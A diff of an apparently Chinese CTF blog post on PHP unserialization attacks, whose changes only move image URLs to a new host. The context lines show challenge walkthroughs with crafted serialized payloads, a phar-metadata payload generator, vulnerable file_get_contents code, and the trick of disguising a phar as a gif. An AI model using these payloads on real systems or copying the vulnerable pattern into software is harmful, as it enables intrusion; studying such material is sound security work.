@@ -32,13 +32,13 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>运行结果：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;name&quot;]=&gt; string(4) &quot;user&quot; [&quot;pwd&quot;]=&gt; string(3) &quot;123&quot; &#125;</span><br><span class="line">string(65) &quot;a:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;pwd&quot;;s:3:&quot;123&quot;;&#125;&quot;</span><br><span class="line">array(3) &#123; [&quot;id&quot;]=&gt; string(1) &quot;1&quot; [&quot;name&quot;]=&gt; string(4) &quot;user&quot; [&quot;pwd&quot;]=&gt; string(3) &quot;123&quot; &#125;</span><br><span class="line">point is (1,2)</span><br><span class="line">s:2:&quot;p1&quot;;</span><br></pre></td></tr></table></figure>
 <h3 id="0x01-利用普通变量或方法"><a href="#0x01-利用普通变量或方法" class="headerlink" title="0x01. 利用普通变量或方法"></a>0x01. 利用普通变量或方法</h3><p>貌似实验吧有一题</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcef0250913c.jpg" alt="5b5da21d2f014.jpg"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-unserialize.assets/5bcef0250913c.jpg" alt="5b5da21d2f014.jpg"></p>
 <p>view-source有如下提示</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5da21d5ecdf.jpg" alt="39.jpg"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-unserialize.assets/5b5da21d5ecdf.jpg" alt="39.jpg"></p>
 <p>试了个开头为0的md5，s878926199a</p>
 <p>得到<code>/user.php?fame=hjkleffifer</code></p>
 <p>打开是这样</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5da21d8ebfd.jpg" alt="40.jpg"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-unserialize.assets/5b5da21d8ebfd.jpg" alt="40.jpg"></p>
 <p>所以说，得先把password序列化再输入，而且要求数组里的user和pass都等于’？？？‘，因为‘==’是比较运算符号，不会检查条件式的表达式的类型。  </p>
 <p><strong><em>根据提示’成也布尔，败也布尔‘，布尔类型的true跟任意字符串在‘==’下成立，就可以构造bool型序列化的password。</em></strong></p>
 <p>经查阅 序列化中 i代表int，a代表array，s代表string，b代表bool，数字代表个数/长度</p>
@@ -46,7 +46,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$test = array("a"=&gt;0,"b"=&gt;0,"c"=&gt;0);</span><br><span class="line">$test2 = '';</span><br><span class="line">$test2=serialize($test);</span><br><span class="line">echo $test2; //类似a:3:&#123;s:1:"a";i:0;s:1:"b";i:0;s:1:"c";i:0;&#125;</span><br><span class="line"></span><br><span class="line">print_r(unserialize($test2));</span><br></pre></td></tr></table></figure>
 <p>构造password<code>a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;}</code></p>
 <p>注意<code>{}</code>前面写参数个数</p>
-<p><img src="https://i.loli.net/2018/10/23/5bceeb84bf033.jpg" alt="41.jpg"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-unserialize.assets/5bceeb84bf033.jpg" alt="41.jpg"></p>
 <p>jarvis oj 一题</p>
 <p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p>
 <p>初始页面是个图片</p>
@@ -71,7 +71,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p><strong>所以</strong>构造一个经反序列化后，file=’pctf.php’的参数 </p>
 <p>即构造<code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p>
 <p>flag</p>
-<p><img src="https://i.loli.net/2018/07/29/5b5da2777090f.jpg" alt="1.jpg"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-unserialize.assets/5b5da2777090f.jpg" alt="1.jpg"></p>
 <h3 id="0x02-PHP-Magic-function"><a href="#0x02-PHP-Magic-function" class="headerlink" title="0x02. PHP: Magic function"></a>0x02. PHP: Magic function</h3><blockquote>
 <p>除利用普通变量或方法外还可以利用Magic function（魔术方法）进行反序列化攻击,有关魔术方法：<a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a></p>
 </blockquote>
@@ -143,7 +143,7 @@ ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = {
 <p>payload.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $demo_v=<span class="string">'phpinfo()'</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    	</span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;demo_v.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"demo.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); </span><br><span class="line">    $obj = <span class="keyword">new</span> demo();</span><br><span class="line">    $phar-&gt;setMetadata($obj);</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>运行demo.php</p>
-<p><img src="https://i.loli.net/2018/10/23/5bcee4a29c793.png" alt="r1.png"></p>
+<p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/php-unserialize.assets/5bcee4a29c793.png" alt="r1.png"></p>
 <h4 id="Example："><a href="#Example：" class="headerlink" title="Example："></a>Example：</h4><p>先是一个文件上传，在flag.php中有以下内容</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$recieve = $_GET[&apos;filename&apos;];</span><br><span class="line"></span><br><span class="line">class flag&#123;</span><br><span class="line">	var $file;</span><br><span class="line">	private $flag = &apos;****&apos;;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if ($this-&gt;file == &apos;phar&apos;)&#123;</span><br><span class="line">			echo $this-&gt;flag;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_get_contents($recieve);</span><br></pre></td></tr></table></figure>
 <p>本地生成phar文件伪装gif，再phar伪协议触发php反序列化</p>
